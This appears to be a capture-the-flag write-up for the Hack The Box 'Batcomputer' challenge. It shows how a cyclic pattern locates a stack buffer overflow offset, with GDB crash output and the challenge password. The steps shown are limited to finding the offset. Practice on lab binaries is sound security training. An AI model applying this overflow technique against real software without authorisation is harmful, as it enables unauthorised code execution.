### Batcomputer

```python
>>> import pwn
>>> pwn.cyclic(137)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabj'
>>> pwn.cyclic_find('vaaa')
84
```

GDB output :
```bash
gdb-peda$ r                                                                                                                                                                                          
Starting program: /home/nickapic/htb/challenges/batcomputer/batcomputer                                                                                                                              
Welcome to your BatComputer, Batman. What would you like to do?                                                                                                                                      
1. Track Joker                                                                                                                                                                                       
2. Chase Joker                                                                                                                                                                                       
> 2                                                                                                                                                                                                  
Ok. Let's do this. Enter the password: b4tp@$$w0rd!                                                                                                                                                  
Access Granted.                                                                                                                                                                                      
Enter the navigation commands: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabj                             
Roger that!                                                                                                                                                                                          
Welcome to your BatComputer, Batman. What would you like to do?                                                                                                                                      
1. Track Joker                                                                                                                                                                                       
2. Chase Joker                                                                                                                                                                                       
> 3
Too bad, now who's gonna save Gotham? Alfred?

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0x7ffff7ed2f33 (<__GI___libc_write+19>:    cmp    rax,0xfffffffffffff000)
RDX: 0x0
RSI: 0x7ffff7fa3723 --> 0xfa5670000000000a
RDI: 0x7ffff7fa5670 --> 0x0
RBP: 0x6161617561616174 ('taaauaaa')
RSP: 0x7fffffffd938 ("vaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabj^%U\260PUUUU")
RIP: 0x55555555531f (ret)
R8 : 0x2e ('.')
R9 : 0x0
R10: 0x7ffff7f55ac0 --> 0x100000000
R11: 0x246
R12: 0x5555555550b0 (endbr64)
R13: 0x0
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)

```


Here the RIP would be overwritten by the first 4 characters shown to us in the RSP which in our case is "vaaa"
